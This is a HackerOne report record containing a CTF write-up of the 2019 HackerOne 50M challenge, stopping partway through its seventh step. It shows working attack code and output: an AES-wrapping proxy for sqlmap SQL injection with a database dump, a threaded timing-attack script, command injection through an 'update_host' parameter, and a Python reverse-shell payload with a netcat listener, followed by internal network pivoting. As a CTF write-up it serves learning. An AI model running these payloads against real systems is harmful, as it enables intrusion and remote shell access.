{"id":507023,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDcwMjM=","url":"https://hackerone.com/reports/507023","title":"CTF Writeup","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-03-09T01:18:22.616Z","submitted_at":"2019-03-09T01:18:22.616Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"voidmercy","url":"/voidmercy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/254/760/23b2eee9e5de8d3d71119050fec0fdbaafd50b2b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:54:55.978Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:54:47.368Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Hackerone 50m-CTF Writeup\nBy [VoidMercy](https://twitter.com/_VoidMercy)\n\nProof of Completion: `c8889970d9fb722066f31e804e351993`\n\n## Step 1: Twitter Post Image Steganography\n\nThe 50M Hackerone challenge began with a [tweet](https://twitter.com/Hacker0x01/status/1100543680383832065) from [@Hacker0x01](https://twitter.com/Hacker0x01). At first, I did not expect this tweet to be the start of the challenge, but little did I know, this tweet marked the beginning of the rabbit hole. Specifically, we can infer from [Cody Brocious](https://twitter.com/daeken)'s [reply](https://twitter.com/daeken/status/1100559538548326401), that the clues related to the CTF are embedded in the tweet.\n\nUpon closer inspection of the tweet, we observe that there are two images attached, and it is likely that they contain information to allow us to advance in the CTF. When trying to click on and save the images, I realized that doing so would download the entire HTML page rather than just the image because of Twitter's HTML styling choices. Instead, to download the images, I opened up the Network tab in Chrome's Developer Tools, navigated to the Img tab as I loaded the tweet, then searched for the two attached images in the tweet, as shown below:\n\n![](img1.jpg)\n\nAfter downloading the images and renaming them to `img1.jpg` and `img2.png`, using the command `file [filenames]`, we can see that one of them is a JPEG image, and another is a PNG image.\n\n```\nalex@WINDOWS-0A3VRFK:/mnt/e/CTF/h1/step1$ file img1.jpg img2.png\nimg1.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 1200x630, frames 3\nimg2.png: PNG image data, 900 x 473, 8-bit/color RGB, non-interlaced\n```\n\nThere are many methods to hide information in an image, which is called Steganography. From my past experience with CTFs, the most common Steganography techniques in a CTF challenge would be the following:\n\n1. Embedding text within the raw bytes of the image.\n2. Bit Steganography, which is hiding data in the bits of the pixel data in an image.\n3. Embedding another file within the image\n4. Hiding pixels in a single color plane\n\nTo test the first idea, we can use the command `strings -n 10 [filenames]`. The `strings` tool extracts ascii text from the raw bytes of a file, and the `-n 10` argument tells the tool to return ascii text that are 10 or more characters long. The reason to specify a length is because odds are, important data stored within the image will not be less than 10 characters long. Thus, the command we run is: `strings -n 10 img1.jpg img2.png`. Parts of the output is shown below:\n\n```\nalex@WINDOWS-0A3VRFK:/mnt/e/CTF/h1/step1$ strings -n 10 img1.jpg img2.png\n1jCe#0S]n]\ni;im{--IK\\^\nZN0Y]   kDkL\n)tx[15tJ..\n_c3.G#33332R\n----------- snip -----------\nykFn+ymL`F\nfKs/DV!Hfb]\n~e:;lD=/S4\n```\n\nSadly, there were no interesting strings in the output. We move on to test the next method.\n\nTo test the second method, we can use a tool called [zsteg](https://github.com/zed-0xff/zsteg), which can be installed with `gem install zsteg`. Because a JPEG image uses lossy compression, least significant bit (LSB) data will likely be destroyed and unrecoverable. So, the PNG image is much more likely to have hidden data. Zsteg is a tool that attempts to extract the strings from many different combinations of pixel color bits. We can run zsteg with the command `zsteg -a img2.png`, where the -a flag tells zsteg to essentially try everything. We get the following output:\n\n```\nalex@WINDOWS-0A3VRFK:/mnt/e/CTF/h1/step1$ zsteg -a img2.png\nimagedata           .. text: \"E_B.\\n3T|=\"\nb4,r,lsb,xy         .. text: \"$3r%2U2#S@6T\"\nb4,g,lsb,xy         .. text: \"%\\\"%S\\#@Sfw`\"\n----------- snip -----------\nb6,bgr,lsb,xy,prime .. text: \"YETYEWUU\"\nb7,b,msb,xy,prime   .. text: \"(4:M \u0026Q(42\"\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\n```\n\nJackpot! We find a link hidden in LSB in the PNG image: `https://bit.do/h1therm`. Now we can move on to the next step.\n\nFor the sake of completeness, the third Steganography method I listed can be tested using the tool [binwalk](https://github.com/ReFirmLabs/binwalk), and the fourth using the tool [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve).\n\n## Step 2: Android APK Reversing\n\nThe link takes us to Google Drive from which we then download an apk file named `h1thermostat.apk`. An APK file stands for Android Package, and is essentially a bunch of files packaged in an archive. Because Android Apps are written in Java and compiled Java code, or Java bytecode, is decompilable, we can actually decompile the code in an APK file. A great tool that does this for us is [jadx](https://github.com/skylot/jadx). We can run jadx, and select the APK file we want to decompile, as shown below:\n\n![](img2.jpg)\n\nLooking through `AndroidManifest.xml`, we can see references to `com.hackerone.thermostat.ThermostatActivity` and `com.hackerone.thermostat.LoginActivity`, which is important Java code the app is running. We navigate to these files and begin reverse engineering them.\n\nI will be focusing on the important parts of the code. Upon first glance of the code, the part that stands out most is the following:\n\n```Java\n private void attemptLogin() throws Exception {\n//----------- snip -----------\nJSONObject jSONObject = new JSONObject();\n        jSONObject.put(\"username\", username);\n        jSONObject.put(\"password\", password);\n        jSONObject.put(\"cmd\", \"getTemp\");\n        Volley.newRequestQueue(this).add(new PayloadRequest(jSONObject, new Listener\u003cString\u003e() {\n            public void onResponse(String str) {\n                if (str == null) {\n                    LoginActivity.this.loginSuccess();\n                    return;\n                }\n                LoginActivity.this.showProgress(false);\n                LoginActivity.this.mPasswordView.setError(str);\n                LoginActivity.this.mPasswordView.requestFocus();\n            }\n        }));\n}\n```\n\nWe observe that the code is creating a JSONObject that is then passed to the constructor of a PayloadRequest. We can see that PayloadRequest is another class jadx decompiled for us, so we can also reverse engineer that. The constructor of the class is as follows:\n\n```Java\npublic PayloadRequest(JSONObject jSONObject, final Listener\u003cString\u003e listener) throws Exception {\n        super(1, \"http://35.243.186.41/\", new ErrorListener() {\n            public void onErrorResponse(VolleyError volleyError) {\n                listener.onResponse(\"Connection failed\");\n            }\n        });\n        this.mListener = listener;\n        this.mParams.put(\"d\", buildPayload(jSONObject));\n    }\n```\n\nWe immediately see ``http://35.243.186.41/`. A URL is a very good sign. Just from the information above, we can infer that the Android app is submitting username, password, and cmd data to the url `http://35.243.186.41/`. This data is somehow combined through the `buildPayload` function and passed as a parameter to the key 'd'. We can see how the JSON object containing the username, password, and cmd is created in the `buildPayload` shown below:\n\n```Java\nprivate String buildPayload(JSONObject jSONObject) throws Exception {\n        SecretKeySpec secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n        byte[] bArr = new byte[16];\n        new SecureRandom().nextBytes(bArr);\n        IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);\n        Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        instance.init(1, secretKeySpec, ivParameterSpec);\n        byte[] doFinal = instance.doFinal(jSONObject.toString().getBytes());\n        byte[] bArr2 = new byte[(doFinal.length + 16)];\n        System.arraycopy(bArr, 0, bArr2, 0, 16);\n        System.arraycopy(doFinal, 0, bArr2, 16, doFinal.length);\n        return Base64.encodeToString(bArr2, 0);\n    }\n```\n\nThe encryption scheme used here is `AES/CBC/PKCS5Padding`, and we also have the secret key. The JSONObject is converted to a string and encrypted with AES. The result is then base64 encoded and returned. Now, we have finished reversing the Android APK, and can move on to attacking the url we found.\n\n## Step 3: SQL Injection\n\nNow we have all the information we need to perform the request the Android app is making. My code that implements the encryption scheme to communicate with the server is shown below:\n\n```python\nfrom Crypto.Cipher import AES\nimport requests, json\n\ndef PKCS5Padding(s):\n    padn = 16 - (len(s) % 16)\n    return s + chr(padn) * padn\n\ndata = {\"username\":\"admin\",\"password\":\"password\",\"cmd\":\"A\"}\nkey = '8O.j\\x1a\\x05\\xe5\";\\x80\\xe9`\\xa0\\xa6Pt'\nencrypted = (\"\\x00\" * 16 + AES.new(key, AES.MODE_CBC, \"\\x00\" * 16).encrypt(PKCS5Padding(json.dumps(data)))).encode(\"base64\")\n\nreq = requests.post(\"http://35.243.186.41/\", data={\"d\": encrypted})\nresponse = req.content.decode(\"base64\")\n\nresponse = AES.new(key, AES.MODE_CBC, response[:16]).decrypt(response[16:])\nprint response.strip()\n```\n\nIt turns out both our data and the response from the server are encrypted and decrypted with the same AES encryption scheme, so we include that in our code. As a result, the response we get from the server is: `{\"success\": false, \"error\": \"Unknown\"}`.\n\nBecause we have ourselves a login form, since the server expects a username and password field, we can try an SQL Injection attack, which is a common attack in CTFs for login pages.\n\nA tool to do this for us is [sqlmap](http://sqlmap.org/). Sqlmap tests for SQL injections given a url and the parameters to test. However, sqlmap by itself cannot encrypt the username and password parameters and send it to server. My solution to this is the create a proxy running on localhost which serves as a bridge between sqlmap and the server. It would take in the username and password from sqlmap, encrypt the data and send it to the server. Likewise, it would receive the response from the server, decrypt it, and send it back to sqlmap. My proxy is shown below:\n\n```python\nfrom flask import Flask, request\nfrom Crypto.Cipher import AES\nimport requests, json\n\napp = Flask(__name__)\n\ndef PKCS5Padding(s):\n    padn = 16 - (len(s) % 16)\n    return s + chr(padn) * padn\n\ndef encrypt_data(data):\n    key = '8O.j\\x1a\\x05\\xe5\";\\x80\\xe9`\\xa0\\xa6Pt'\n    encrypted = (\"\\x00\" * 16 + AES.new(key, AES.MODE_CBC, \"\\x00\" * 16).encrypt(PKCS5Padding(json.dumps(data)))).encode(\"base64\")\n    return encrypted\n\ndef decrypt_data(data):\n    key = '8O.j\\x1a\\x05\\xe5\";\\x80\\xe9`\\xa0\\xa6Pt'\n    response = data.decode(\"base64\")\n    response = AES.new(key, AES.MODE_CBC, response[:16]).decrypt(response[16:])\n    return response[:-ord(response[-1])]\n\n@app.route(\"/\", methods=[\"POST\"])\ndef send():\n    data = {\"username\": request.form.get(\"username\"), \"password\": request.form.get(\"password\"), \"cmd\": request.form.get(\"cmd\")}\n    enc = encrypt_data(data)\n    req = requests.post(\"http://35.243.186.41/\", data={\"d\": enc})\n    return decrypt_data(req.text)\n\napp.run(debug=False, host='0.0.0.0', port=80)\n```\n\nNow, since my proxy is running on localhost port 80, we should point sqlmap to http://localhost:80. The command I used is `sqlmap -u \"http://localhost:80\" --method=POST --data=\"username=admin\u0026password=admin\" --dump --level=3 --risk=1`. The `-u \"http://localhost:80\"` specifies the url, `--method=POST` specifies the method, `--data=\"username=admin\u0026password=admin\"`, specifies the post data, `--dump` tells sqlmap to dump all the data, and `--level=3 --risk=1` increases the types of sql injection tests to try.\n\nAfter running this, sqlmap was able to dump the database through an error based attack, and we get the following:\n\n```\nDatabase: flitebackend\nTable: users\n[1 entry]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+----+----------+----------------------------------+\n\nDatabase: flitebackend\nTable: devices\n[30 entries]\n+----+-----------------+\n| id | ip              |\n+----+-----------------+\n| 1  | 192.88.99.253   |\n| 2  | 192.88.99.252   |\n| 3  | 10.90.120.23    |\n| 4  | 244.188.235.4   |\n| 5  | 192.88.99.184   |\n----------- snip -----------\n```\n\nIn the users table, we see an admin account, and a password. If we google the password hash, we find that it is the md5 of \"password.\" We can try providing the credentials admin:password to the site, but quickly discover that this only allows us to set the cmd parameters to getTemp and setTemp, and does not lead to any other attack surface.\n\nNext, we inspect the list of 151 ips. To quickly scan each of the ips, I used to tool [nmap](https://nmap.org/), a port scanning tool. To use this tool, I compiled a list of the ips, and ran nmap on each of them using the command `nmap -v -p80 $(cat ips.txt)` The `-v` argument tells nmap to be more verbose, the `-p80` argument checks if port 80 of each ip is open or not, and the `$(cat ips.txt)` tells bash to perform the command for every line in ips.txt, in other words, every ip.\n\nIf we scroll through the output, we find that port 80 is open for only a single host:\n\n```\n----------- snip -----------\nNmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)\nHost is up (0.020s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n----------- snip -----------\n```\n\nThis host, `104.196.12.98`,  will be our next target.\n\n## Step 4: Timing Attack\n\nVisiting this site, we see yet another login page:\n\n![](img3.jpg)\n\nWe can view the source code of the HTML page to see what it does:\n\n```\n\u003c!doctype html\u003e\n\u003chtml\u003e\n\t\u003chead\u003e\n\t\t\u003ctitle\u003eFliteThermostat - Log In\u003c/title\u003e\n\t\u003c/head\u003e\n\t\u003cbody\u003e\n\t\t\n\t\t\u003ch1\u003eFliteThermostat Login\u003c/h1\u003e\n\t\tUsername: \u003cinput type=\"text\" id=\"username\" name=\"username\"\u003e\u003cbr\u003e\n\t\tPassword: \u003cinput type=\"password\" id=\"password\" name=\"password\"\u003e\u003cbr\u003e\n\t\t\u003cbutton id=\"login\" onClick=\"login()\"\u003eLog In\u003c/button\u003e\n\t\t\u003cform id=\"form\" method=\"POST\"\u003e\u003cinput type=\"hidden\" id=\"hash\" name=\"hash\"\u003e\u003c/form\u003e\n\t\t\u003cscript src=\"login.js\"\u003e\u003c/script\u003e\n\t\u003c/body\u003e\n\u003c/html\u003e\n```\n\nWe observe that the `login()` function from `login.js` is called when the user presses submit, and there is a POST form that submits a single value called `hash`. Just from this information alone, we can surmise that the login function generates a hash based on the username and password, then submits that to the form through the parameter hash. We can verify this theory using [Burp Suite](https://portswigger.net/burp) and setting our browser's proxy server to use Burp's proxy:\n\n![](img4.jpg)\n\nNow, we need to attack this login somehow. Because the username and password is hashed, an attack like SQL Injection is out of the question because a hash cannot be reversed, so as a result, the username and password would not be passed into a database query. Thus, an injection attack is out of the question. So, my ideas were:\n\n1. The hashing method is weak and there are a lot of collisions\n2. Timing attack on the hash\n\nTo test these ideas, I copied the javascript code from login.js that generates a hash and modified it to take command line parameters when run with [node](https://nodejs.org/en/).\n\nTo test the first idea, I tried to find collisions by using the username `admin`, and testing numerical passwords that counted up from 1. However, this did not work and the hashing algorithm seemed to be secure.\n\nFor the second idea, I wrote a script that iterated through all 256 possible values for a byte and sent those as the hash field. I would then time the time it takes for the server to respond. At first, this idea did not work, but I later realized that I did not pad the hash to 32 bytes, since the server is expecting a 32 byte hash. After doing so, I discovered that for the first byte, every response took around 0.5 seconds except for one byte, 0xf9, which always took 1 second or longer for the server to respond. This was it, there was a 0.5 second pause in between every correct character, and using this, we can perform a timing attack. My code to do this is shown below:\n\n```python\nimport requests\nimport time\nimport threading\n\ndef getthreshold(correct_hash):\n\tnext_minimum = 1 + (len(correct_hash) / 2) * 0.5\n\treturn next_minimum\n\ndef testshit(fhash, correct_hash, curtest, ret):\n\tdeets = []\n\tc = 0\n\tgood = True\n\tret[int(curtest, 16)] = False\n\twhile True:\n\t\tstart = time.time()\n\t\tr = requests.post(url, data={'hash': fhash})\n\t\tend = time.time()\n\t\tprint curtest, end - start, getthreshold(correct_hash)\n\t\tif \"Invalid\" not in r.text:\n\t\t\tc += 1\n\t\t\tif c \u003e= 8:\n\t\t\t\tret[int(curtest, 16)] = True\n\t\t\t\treturn True\n\t\telse:\n\t\t\treturn False\n\treturn False\n\t\t\n\nurl = \"http://104.196.12.98\"\ncorrect_hash = \"\"\n\nnumthreads = 32\n\nwhile len(correct_hash) \u003c 64:\n\tcorrect_hashs = [0]*256\n\tfor i in range(0, 0xff+1, numthreads):\n\t\tthreads = []\n\t\tfor a in range(numthreads):\n\t\t\tfhash = correct_hash + hex(i + a)[2:].zfill(2)\n\t\t\tfhash += \"a\"*(64-len(fhash))\n\t\t\tt = threading.Thread(target=testshit, args=(fhash, correct_hash, hex(i + a)[2:].zfill(2), correct_hashs))\n\t\t\tt.start()\n\t\t\tthreads.append(t)\n\t\tfor a in range(numthreads):\n\t\t\tthreads[a].join()\n\t\tfound = False\n\t\tfor a in range(numthreads):\n\t\t\tif correct_hashs[i + a]:\n\t\t\t\tcorrect_hash += hex(i + a)[2:].zfill(2)\n\t\t\t\tfound = True\n\t\t\t\tbreak\n\t\tif found:\n\t\t\tbreak\n\tprint correct_hash\n```\n\nAfter running this script for a while, we receive the hash that allows us to authenticate: `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8` To authenticate with this hash in our browser, we can use Burp Suite again to intercept the request and change the value of the hash to the hash we just found.\n\n## Step 5: Command Injection Through GET Parameters\n\nAfter logging in, we are greeted with more options:\n\n![](img5.jpg)\n\nThe `Temperature control` page seems to just implement the SetTemp and GetTemp functions we discovered from the Android APK before.\n\nThe `Check for Updates` page, however, seems much more interesting. After clicking on it, we see:\n\n```\nFliteThermostat Check for Updates\n\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nBecause we see the server trying to contact a link, the first thought that jumps at me is that there might be a Server Side Request Forgery (SSRF) bug, which occurs when we are able to control the url the server communicates with.\n\nTo test this idea, I thought that maybe there might be parameters in the url that allow us to control the host and port. I tested the url, `http://104.196.12.98/update?port=1337`, with the GET parameter port set to 1337 and we get the response:\n\n```\nConnecting to http://update.flitethermostat:1337/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nBingo! We see that the port has changed from 5000 to our provided value, 1337. Going along this train of thought, there must be a parameter that controls the hostname.\n\nThis step actually took me the longest since I had tried numerous parameters that seem reasonable such as ip, host, hostname, domain. However, Coby's [tweet](https://twitter.com/daeken/status/1101358829168558080) of a single underscore allowed me to finally guess the parameter: update_host. When we visit `http://104.196.12.98/update?port=1337\u0026update_host=hacked`, we get the following:\n\n```\nConnecting to http://hacked:1337/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nBecause I had been so absorbed in the idea of an SSRF bug, I proceeded to port write a port scanner for every port on localhost, seeing if I would get a different response, but this did not work.\n\nI thought about other ideas to try on the parameters, and I thought of command injection, and tried the url: `http://104.196.12.98/update?port=1337\u0026update_host=$(id)`\n\n```\nConnecting to http://uid=0(root) gid=0(root) groups=0(root):1337/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nJackpot. Additionally, it seems the process is running as root, so we also have root access to the server. Next, we can get a shell on the box and explore the server.\n\n## Step 6: Pivoting\n\nFirst step is to obtain a reverse shell. We can find reverse shell payloads [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and the python one worked for me. The code to send the reverse shell is as follows:\n\n```python\nimport requests\n\ncookie = {\"session\":\"eyJsb2dnZWRJbiI6dHJ1ZX0.XH6IVA.95r7Iy7hLrnRnmPhKsJ3y7eIEwk\"}\n\nurl = \"\"\"http://104.196.12.98/update?update_host=$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"REDACTED\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') \u0026port=80\"\"\"\nr = requests.get(url, cookies=cookie)\n```\n\nWe can change the IP and port of the reverse shell to point to our server, then listen on that port on our server using `nv -lvp [port number]`.\n\n```\nroot@ctf:~# nc -lvp 1337\nListening on [0.0.0.0] (family 0, port 1337)\nConnection from 98.12.196.104.bc.googleusercontent.com 52814 received!\n/bin/sh: 0: can't access tty; job control turned off\n# ls\n1\nDockerfile\n__pycache__\nlogin.js\nmain.py\nrequirements.txt\ntemplates\ntemptarget\nupdate.sh\nuwsgi.ini\n```\n\nNow we can explore the machine. However, it seems to be running in a docker container, and there aren't any other interesting files. However, we can check the network of the docker container using `ip addr show`, and we see the following:\n\n```\n# ip addr show\n1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n158: eth0@if159: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default\n    link/ether 02:42:ac:17:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.23.0.3/16 brd 172.23.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n```\n\nThe server seems to be in a local network, with the subnet `172.23.0.3/16`. Maybe there are other open apps on the same network?\n\nWe can check whether there's an app on port 80 of an ip using `curl` with `curl 172.23.0.3`. \n\n```\n# curl 172.23.0.3\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   451  100   451    0     0   233k      0 --:--:-- --:--:-- --:--:--  440k\n\u003c!doctype html\u003e\n\u003chtml\u003e\n        \u003chead\u003e\n                \u003ctitle\u003eFliteThermostat - Log In\u003c/title\u003e\n        \u003c/head\u003e\n        \u003cbody\u003e\n\n                \u003ch1\u003eFliteThermostat Login\u003c/h1\u003e\n                Username: \u003cinput type=\"text\" id=\"username\" name=\"username\"\u003e\u003cbr\u003e\n                Password: \u003cinput type=\"password\" id=\"password\" name=\"password\"\u003e\u003cbr\u003e\n                \u003cbutton id=\"login\" onClick=\"login()\"\u003eLog In\u003c/button\u003e\n                \u003cform id=\"form\" method=\"POST\"\u003e\u003cinput type=\"hidden\" id=\"hash\" name=\"hash\"\u003e\u003c/form\u003e\n                \u003cscript src=\"login.js\"\u003e\u003c/script\u003e\n        \u003c/body\u003e\n\u003c/html\u003e\n```\n\nSure enough, since we used curl on the server's own ip, the server's own web application is queried and returned. However, lets check other IPs on the subnet. We know that DHCP uses low IPs on the subnet first, so it is logical to check around our IP, such as 172.23.0.2, and 172.23.0.4:\n\n```\n# curl 172.23.0.4\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\n  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0curl: (7) Failed to connect to 172.23.0.4 port 80: No route to host\n# curl 172.23.0.2\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1669  100  1669    0     0   757k      0 --:--:-- --:--:-- --:--:-- 1629k\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n----------- snip -----------\n\u003cb\u003eMaterials contained within are confidential and for HackerOne employee eyes only\u003c/b\u003e\n\n                \u003c/div\u003e\n                \u003cscript src=\"//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n                \u003cscript src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n        \u003c/body\u003e\n\u003c/html\u003e\n```\n\nSweet! We found another web application running on the network, and this will be our next target.\n\n## Step 7: HTML Injection and Local File Download\n\nUsing curl to access the webpage, we find a couple of endpoints: /auth, /reports, /invoices, /invoices/newInvoice.js. The newInvoice.js looks interesting, so we can curl it, and we get:\n\n```javascript\nvar itemCount = 0;\n\nfunction addItem() {\n        var table = $('#item-table \u003e tbody');\n        var tr = $('\u003ctr\u003e');\n        function add(pfx, def) {\n                tr.append($('\u003ctd\u003e\u003cinput type=\"text\" id=\"' + pfx + '-' + itemCount + '\" value=\"' + def + '\"\u003e\u003c/td\u003e'));\n        }\n        add('quantity', '1');\n        add('name', '');\n        add('desc', '');\n        add('unit-price', '10');\n        tr.append($('\u003ctd id=\"total-' + itemCount + '\"\u003e\u003c/td\u003e'));\n        table.append(tr);\n        $('#quantity-' + itemCount).change(updateTotals);\n        $('#unit-price-' + itemCount).change(updateTotals);\n        itemCount++;\n        updateTotals();\n}\n\nfunction updateTotals() {\n        for(var i = 0; i \u003c itemCount; ++i) {\n                var amt = parseFloat($('#quantity-' + i).val()) * parseFloat($('#unit-price-' + i).val());\n                $('#total-' + i).text('$' + amt);\n        }\n}\n\nfunction encodeInvoice() {\n        var items = [];\n        for(var i = 0; i \u003c itemCount; ++i) {\n                items[i] = [\n                        $('#quantity-' + i).val(),\n                        $('#name-' + i).val(),\n                        $('#desc-' + i).val(),\n                        $('#unit-price-' + i).val()\n                ];\n        }\n\n        var jobj = {\n                companyName: $('#recipient-company-name').val(),\n                email: $('#recipient-email').val(),\n                invoiceNumber: $('#invoice-number').val(),\n                date: $('#invoice-date').val(),\n                items: items,\n                styles: {body: {'background-color' : 'white'}}\n        };\n\n        var p = JSON.stringify(jobj);\n        return p;\n}\n\nfunction preview() {\n        // kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH\n        //  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9\n        var p = encodeInvoice();\n        var url = 'http://' + window.location.hostname + '/invoices/preview?d=' + encodeURIComponent(p);\n        url = url.replace(/[\\u00A0-\\u9999\u003c\u003e\\\u0026]/gim, function(i) { return '\u0026#'+i.charCodeAt(0)+';'; });\n        $('#iframe-box').empty();\n        $('#iframe-box').append($('\u003ciframe width=\"100%\" height=\"500px\" src=\"' + url + '\"\u003e\u003c/iframe\u003e'));\n}\nfunction savePDF() {\n        var p = encodeInvoice();\n        var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);\n        url = url.replace(/[\\u00A0-\\u9999\u003c\u003e\\\u0026]/gim, function(i) { return '\u0026#'+i.charCodeAt(0)+';'; });\n        var a = $('\u003ca download href=\"' + url + '\"\u003e\u003cspan\u003e\u003ci\u003eIf your download does not start, click here\u003c/i\u003e\u003c/span\u003e\u003c/a\u003e');\n        $('#iframe-box').append(a);\n        a.find('span').trigger('click');\n}\n\n$(document).ready(function() {\n        addItem();\n        $('#add-item').click(addItem);\n        $('#preview').click(preview);\n        $('#save-pdf').click(savePDF);\n});\n```\n\nThe two most important functions are preview() and savePDF(). After reversing it, we see that preview() and savePDF() sends url-encoded data to /invoices/preview and /invoices/pdfize with a GET parameter. We can run the javascript functions using nodejs again, and find that the url-encoded data is of the form:\n\n```\n{\"companyName\":\"something\",\"email\":\"something\",\"invoiceNumber\":\"something\",\"date\":\"something\",\"items\":[],\"styles\":{\"body\":{\"background-color\":\"white\"}}}\n```\n\nWe can urlencode this payload ourselves and send a request to /preview and /pdfize ourselves with\n\n```\ncurl 172.23.0.2/invoices/preview?d=%7B%22companyName%22%3A%22something%22%2C%22email%22%3A%22something%22%2C%22invoiceNumber%22%3A%22something%22%2C%22date%22%3A%22something%22%2C%22items%22%3A%5B%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D\n```\n\nand we get:\n\n```\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n        \u003chead\u003e\n                        \u003cmeta charset=\"utf-8\"\u003e\n                        \u003ctitle\u003eAccounting\u003c/title\u003e\n                        \u003cmeta name=\"viewport\" content=\"width=device-width\"\u003e\n                        \u003clink rel=\"stylesheet\" href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\"\u003e\n                        \u003cscript src=\"//code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n                        \u003cstyle\u003e.navbar-fixed-top { position: absolute!important; }\u003c/style\u003e\n\n\n        \u003c/head\u003e\n        \u003cbody\u003e\n----------- snip -----------\n\u003c/div\u003e\n\n                \u003c/div\u003e\n                \u003cscript src=\"//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" 